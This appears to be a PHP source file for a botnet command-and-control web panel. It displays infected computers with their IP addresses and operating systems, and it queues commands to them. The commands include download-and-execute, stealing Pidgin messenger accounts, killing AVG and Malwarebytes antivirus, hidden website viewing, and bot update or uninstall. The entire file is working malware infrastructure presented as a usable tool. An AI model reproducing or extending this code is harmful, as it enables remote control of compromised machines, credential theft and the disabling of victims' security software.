<?php 
Class Functions
{
    private $db;
 
    function __construct($DB_con)
    {
      $this->db = $DB_con;
    }
   
   public function viewBots()
   {  	
		$p_report = $this->db->prepare("SELECT * FROM reports");
		$p_report->execute();
		$p_count = $p_report->rowCount();
	
		if ($p_count > 0)
		{
			echo '<table class="table">
			<tr>
			<th>Recent Reports</th>
			</tr>';
		
		foreach ($p_report as $row)
		{	
				
				if (isset($_POST[$row['uid']]))
				{
				$uid = $row['uid'];
				$task = $_POST['task'];
				$para = $_POST['parameter'];

				$task = str_replace(" ","",$task);

				if ($task == "CheckAV")
				{
				$task = 'chkav';
				}
				if ($task == "DownloadAndExecute")
				{
				$task = 'dl';
				}
				if ($task == "GrabPidginAccount")
				{
				$task = 'stealpidgacc';
				}
				if ($task == "KillAVG")
				{
				$task = 'avgkill';
				}
				if ($task == "KillMalwarebytes")
				{
				$task = 'mbkill';
				}
				if ($task == "Uninstall")
				{
				$task = 'uninstall';
				}
				if ($task == "Update")
				{
				$task = 'update';
				}
				if ($task == "ViewWebsite(HiddenView)")
				{
				$task = 'ie=h';
				}
				if ($task == "")
					{
				echo 'Suspicious activity. IP Logged.'; // We'll Get round to it.
				session_destroy(); // RUN RUN RUN!
					header('http://google.com'); // Let's go to Google shall we?
					// Insert IP Block list code here.
						}

				$taskq2 = $this->db->prepare("INSERT INTO tasks (uid,task,parameter,status) VALUES (:uid,:task,:para,'0')");
				$taskq2->execute(array(':uid'=>$uid, ':task'=>$task, ':para'=>$para));
						header("Refresh:0");
						}
			$v = (int)time() - $row['time'];
				if ($v <= 500)
				{	
		$test =  date("H:i:s", $row['time']);			
						echo "<tr><td><span style=\"color:green;\"class=\"glyphicon glyphicon-asterisk\"></span>&nbsp;<a href=#>".$row['computer']."</a>";
						
						// Add task for certain bot
						echo '<input type="button"  name="'.$row['uid'].'" data-toggle="modal" data-target="#'.$row['uid'].'" class="btn btn-primary btn-xs" value="Add task"  style="float: right; "> </form>
						<div class="modal fade" id="'.$row['uid'].'" role="dialog">
						<div class="modal-dialog">
						<div class="modal-content">
						<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Add task for bot '.$row['computer'].'</h4>
						</div>
						<div class="modal-body">
						    <form method="POST" action="" enctype="application/x-www-form-urlencoded">
								<div class="input-group">
								<div class="btn-group">
								<select name="task">
								<option>Download And Execute</option>
								<option>Grab Pidgin Account</option>
								<option>Kill AVG</option>
								<option>Kill Malwarebytes</option>
								<option>Check AV</option>
								<option>View Website (Hidden View)</option>
								<option>Update</option>
								<option>Uninstall</option>
							</select>
							<br><br>
							<input type="text" class="form-control" placeholder="Parameter" name="parameter">
							</div>
							</div><br>
							<input type="submit" name="'.$row['uid'].'" class="btn btn-success" value="Create">
							</form>
						</div>
						<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						</div>
						</div>
						</div>
						</div>
						</div>';

						// DISPLAYS BOT INFORMATION
						echo ' <input type="button"  name="'.$row['id'].'" data-toggle="modal" data-target="#'.$row['id'].'" class="btn btn-primary btn-xs" value="Information"  style="float: right;  margin-right: 10px"> </form>
						<div class="modal fade" id="'.$row['id'].'" role="dialog">
						<div class="modal-dialog">
						<div class="modal-content">
						<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Bot information '.$row['computer'].'</h4>
						</div>
						<div class="modal-body">
							';
						
						$name_query = $this->db->prepare("SELECT * FROM reports WHERE computer=:name ");
						$name_query->execute(array(':name'=>$row['computer']));

						foreach ($name_query as $row)
						{
						echo '<b>Computername:</b>' . $row['computer']. '</b><br>';
						echo '<b>IP: </b>' . $row['ip']. '</b><br>';
						echo '<b>OS: </b>' . $row['os']. '</b><br>';
						echo '<b>UID: </b>' . $row['uid']. '</b><br>';
						echo '<b>Last connected: </b>' . $test. '</b><br>';
						}
						echo '</div>
						<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						</div>
						</div>
						</div>
						</div>
						</div>';	
						

				}
				if ($v > 500)
				{
					$test =  date("H:i:s", $row['time']);
						echo "<tr><td><span style=\"color:red;\"class=\"glyphicon glyphicon-asterisk\"></span>&nbsp;<a href=#>".$row['computer']."</a>";
				
							
						echo '<input type="button"  name="'.$row['uid'].'" data-toggle="modal" data-target="#'.$row['uid'].'" class="btn btn-primary btn-xs" value="Add task"  style="float: right; "> </form>
						<div class="modal fade" id="'.$row['uid'].'" role="dialog">
						<div class="modal-dialog">
						<div class="modal-content">
						<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Add task for bot '.$row['computer'].'</h4>
						</div>
						<div class="modal-body">
						    <form method="POST" action="" enctype="application/x-www-form-urlencoded">
								<div class="input-group">
								<div class="btn-group">
								<select name="task">
								<option>Download And Execute</option>
								<option>Grab Pidgin Account</option>
								<option>Kill AVG</option>
								<option>Kill Malwarebytes</option>
								<option>Check AV</option>
								<option>View Website (Hidden View)</option>
								<option>Update</option>
								<option>Uninstall</option>
							</select>
							<br><br>
							<input type="text" class="form-control" placeholder="Parameter" name="parameter">
							</div>
							</div><br>
							<input type="submit" name="'.$row['uid'].'" class="btn btn-success" value="Create">
							</form>
						</div>
						<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						</div>
						</div>
						</div>
						</div>
						</div>';

						// BOT INFO
						echo ' <input type="button"  name="'.$row['id'].'" data-toggle="modal" data-target="#'.$row['id'].'" class="btn btn-primary btn-xs" value="Information"  style="float: right; margin-right: 5px"> </form>
						<div class="modal fade" id="'.$row['id'].'" role="dialog">
						<div class="modal-dialog">
						<div class="modal-content">
						<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Bot information '.$row['computer'].'</h4>
						</div>
						<div class="modal-body">
							';
						
						$name_query = $this->db->prepare("SELECT * FROM reports WHERE computer=:name ");
						$name_query->execute(array(':name'=>$row['computer']));

						foreach ($name_query as $row)
						{
						echo '<b>Computername:</b>' . $row['computer']. '</b><br>';
						echo '<b>IP: </b>' . $row['ip']. '</b><br>';
						echo '<b>OS: </b>' . $row['os']. '</b><br>';
						echo '<b>UID: </b>' . $row['uid']. '</b><br>';
						echo '<b>Last connected: </b>' . $test . '</b><br>';
						}
						echo '</div>			
						<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						</div>
						</div>
						</div>
						</div>
						</div>';	
						
				}
		}
		
		echo '</table';
		}else{
			echo "No active bots";
		}
   }
   
   public function AddTask()
   {

    if (isset($_POST['AddTask']))
    {
      $uid = $_POST['uid'];
      $task = $_POST['task'];
      $para = $_POST['parameter'];

      $task = str_replace(" ","",$task);

    if ($task == "CheckAV")
    {
    $task = 'chkav';
    }
    if ($task == "DownloadAndExecute")
    {
    $task = 'dl';
    }
    if ($task == "GrabPidginAccount")
    {
    $task = 'stealpidgacc';
    }
    if ($task == "KillAVG")
    {
    $task = 'avgkill';
    }
    if ($task == "KillMalwarebytes")
    {
    $task = 'mbkill';
    }
    if ($task == "Uninstall")
    {
    $task = 'uninstall';
    }
    if ($task == "Update")
    {
    $task = 'update';
    }
    if ($task == "ViewWebsite(HiddenView)")
    {
    $task = 'ie=h';
    }
    if ($task == "")
    {
    echo 'Suspicious activity. IP Logged.'; // We'll Get round to it.
    session_destroy(); // RUN RUN RUN!
    header('http://google.com'); // Let's go to Google shall we?
    // Insert IP Block list code here.
	}

	$taskq = $this->db->prepare("INSERT INTO tasks (uid,task,parameter,status) VALUES (:uid,:task,:para,'0')");
	$taskq->execute(array(':uid'=>$uid, ':task'=>$task, ':para'=>$para));
     header("Refresh:0");
	}

    echo '     
          <form method="POST" action="" enctype="application/x-www-form-urlencoded">
            <div class="input-group">
            <input type="text" class="form-control" placeholder="Use 0 for all bots!" name="uid" value="">
            <br><br>
              <div class="btn-group">
                <select name="task">
                <option>Download And Execute</option>
                <option>Grab Pidgin Account</option>
                <option>Kill AVG</option>
                <option>Kill Malwarebytes</option>
                <option>Check AV</option>
                <option>View Website (Hidden View)</option>
                <option>Update</option>
                <option>Uninstall</option>
              </select>
            <br><br>
            <input type="text" class="form-control" placeholder="Parameter" name="parameter">
            </div>
            </div><br>
            <input type="submit" name="AddTask" class="btn btn-success" value="Create">
            </form>';

   }

   public function ViewAllTasks()
   {

    $p_report = $this->db->prepare("SELECT * FROM tasks");
    $p_report->execute();
    $p_count = $p_report->rowCount();
    
    if ($p_count == 0)
    {
          echo '
                <div class="alert alert-danger">
                <i class="glyphicon glyphicon-warning-sign"></i> &nbsp; No tasks found
                </div>';
    }   

    if($p_count > 0)
    {   echo '<table class="table">
    <tr>
    <th>UID</th>
    <th>Type</th>
    <th>Status</th>
    <th>Parameter</th>
    <th>Remove</th>';
    } 

    foreach ($p_report as $name_data)
    {
      if ($p_count > 0)
      {
        echo "<tr>";
        if ($name_data['uid'] == "0")
        {
          echo "<td>All Bots</td>";
        }
        else
        {
          echo "<td>".$name_data['uid']."</td>";
        }
        if ($name_data['task'] == "ie=h")
        {
          echo "<td>View Website (Hidden)";
        }
        if ($name_data['task'] == "chkav")
        {
          echo "<td>Check AV</td>";
        }
        if ($name_data['task'] == "dl")
        {
        echo "<td>Download And Execute</td>";
        }
        if ($name_data['task'] == "uninstall")
        {
          echo "<td>Uninstall Bot</td>";
        }
        if ($name_data['task'] == "update")
        {   
          echo "<td>Update Bot</td>";
        }
        if ($name_data['task'] == "stealpidgacc")
        {
          echo "<td>Steal Pidgin Account</td>";
        } 
        if ($name_data['task'] == "avgkill")
        {
          echo "<td>Kill AVG</td>";
        }
        if ($name_data['task'] == "mbkill")
        {
          echo "<td>Kill Malwarebytes</td>";
        }   
        if ($name_data['status'] == '0')
        {
            echo "<td>Waiting <span class=\"glyphicon glyphicon-time\"></span> (".$name_data['exec'].")</td>";
        }
        if ($name_data['status'] == '1')
        {
            echo "<td>Executed</td>";
        }
            echo "<td>".$name_data['parameter']."</td>";
        }

      if(isset($_POST[$name_data['id']]) and $_SERVER['REQUEST_METHOD'] == "POST")
      { 
        $uid = $name_data['uid'];
        $task = $name_data['task'];
        $parameter = $name_data['parameter'];

        $q = $this->db->prepare("DELETE FROM tasks WHERE uid=:uid AND task=:task AND parameter=:para");
        $q->execute(array(':uid'=>$uid,':task'=>$task,':para'=>$parameter));
        header("Refresh:0");
      }
        echo '<form action="tasks" method="post">';
        echo '<td><input type="submit"  name="'.$name_data['id']. '" class="btn btn-primary btn-xs" value="Remove Task"></td>';
        echo "</form></tr>";
      }

   }

  public function notLoggedIn()
  {
    if  (!isset($_SESSION['user_session']))
    {
     header("Refresh:0");
     header('Location: login');}
    
  }

   public function getinfo()
   { 
    
    // Give the amount of bots connected
    $bots1 = $this->db->prepare("SELECT * FROM reports");
    $bots1->execute();
    $botscount = $bots1->rowCount();
    
    // Give the amount of tasks
    $tasks1 =  $this->db->prepare("SELECT * FROM tasks");
    $tasks1->execute();
    $taskcount = $tasks1->rowCount(); 
	
    // Amount of tasks executed(includes deleted tasks)
    $TaskExec1 = $this->db->prepare("SELECT * FROM logs");
    $TaskExec1->execute();
    $TaskExec = $TaskExec1->rowCount();
    $message = "  
    <li><b>Amount Of bots: </b>" . $botscount . "
    <li><b>Amount Of tasks: </b>". $taskcount . "</li>
    <li><b>Amount Of Executed Tasks: </b>" . $TaskExec . "  </li>";  
   return $message;
   }
}

?>